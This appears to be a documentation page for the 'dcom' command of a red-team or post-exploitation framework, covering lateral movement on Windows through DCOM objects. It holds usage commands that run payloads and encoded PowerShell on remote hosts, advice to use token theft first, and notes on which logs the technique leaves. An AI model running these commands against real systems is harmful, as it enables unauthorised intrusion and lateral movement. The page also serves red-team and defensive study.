+++
title = "dcom"
chapter = false
weight = 110
hidden = false
+++

## Summary

Execute commands on remote hosts via DCOM (Distributed Component Object Model) lateral movement. Creates COM objects on remote machines using `CoCreateInstanceEx` and invokes shell execution methods. Three DCOM objects supported: MMC20.Application, ShellWindows, and ShellBrowserWindow. No subprocess spawning.

{{% notice info %}}Windows Only{{% /notice %}}

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | Yes | exec | Action: `exec` |
| host | Yes | - | Target hostname or IP address |
| object | No | mmc20 | DCOM object: `mmc20`, `shellwindows`, `shellbrowser` |
| command | Yes | - | Command or program to execute |
| args | No | - | Arguments to pass to the command |
| dir | No | C:\Windows\System32 | Working directory on the target |

## Usage

### Execute via MMC20.Application (Recommended)
```
dcom -action exec -host 192.168.1.50 -object mmc20 -command "cmd.exe" -args "/c whoami > C:\temp\out.txt"
dcom -action exec -host DC01 -command "C:\Users\Public\payload.exe"
```
Most reliable method. Uses `Document.ActiveView.ExecuteShellCommand`.

### Execute via ShellWindows
```
dcom -action exec -host 192.168.1.50 -object shellwindows -command "cmd.exe" -args "/c ipconfig > C:\temp\net.txt"
```
Requires `explorer.exe` to be running on the target (interactive session). Uses `Item().Document.Application.ShellExecute`.

### Execute via ShellBrowserWindow
```
dcom -action exec -host 192.168.1.50 -object shellbrowser -command "powershell.exe" -args "-enc <base64>"
```
Less reliable on modern Windows. Uses `Document.Application.ShellExecute`.

## Example Output

### Successful Execution
```
DCOM MMC20.Application executed on 192.168.1.50:
  Command: cmd.exe
  Args: /c whoami > C:\temp\out.txt
  Directory: C:\Windows\System32
  Method: Document.ActiveView.ExecuteShellCommand
```

### Connection Error
```
Failed to create MMC20.Application on 192.168.1.50: CoCreateInstanceEx failed: HRESULT 0x800706BA
```
HRESULT 0x800706BA = RPC server is unavailable (host unreachable or DCOM not enabled).

## Operational Notes

- **Authentication**: Uses the current security context. Run `make-token` or `steal-token` first to authenticate as a domain user with admin rights on the target.
- **No output capture**: DCOM execution is fire-and-forget — commands run on the target but output is not returned. Redirect output to a file and retrieve it via `smb` or `cat`.
- **DCOM must be enabled**: The target must have DCOM enabled (default on Windows). Firewall must allow RPC traffic (TCP 135 + dynamic ports).
- **Admin required**: DCOM execution requires local administrator privileges on the target host.
- **Object selection**:
  - `mmc20`: Most reliable, works on all modern Windows versions
  - `shellwindows`: Requires an interactive explorer.exe session
  - `shellbrowser`: May not work on Windows 10+ (CLSID restricted in newer versions)
- **Opsec**: DCOM execution creates processes on the target under the authenticated user's context. Event ID 4624 (logon type 3) will be generated. Process creation events (4688) will show the executed command.

## Common HRESULT Errors

| HRESULT | Meaning |
|---------|---------|
| 0x800706BA | RPC server unavailable (host unreachable, firewall, or DCOM disabled) |
| 0x80070005 | Access denied (insufficient privileges on target) |
| 0x80004005 | Unspecified error (CLSID not registered or blocked on target) |
| 0x800706BE | Remote procedure call failed |

## MITRE ATT&CK Mapping

- **T1021.003** — Remote Services: Distributed Component Object Model
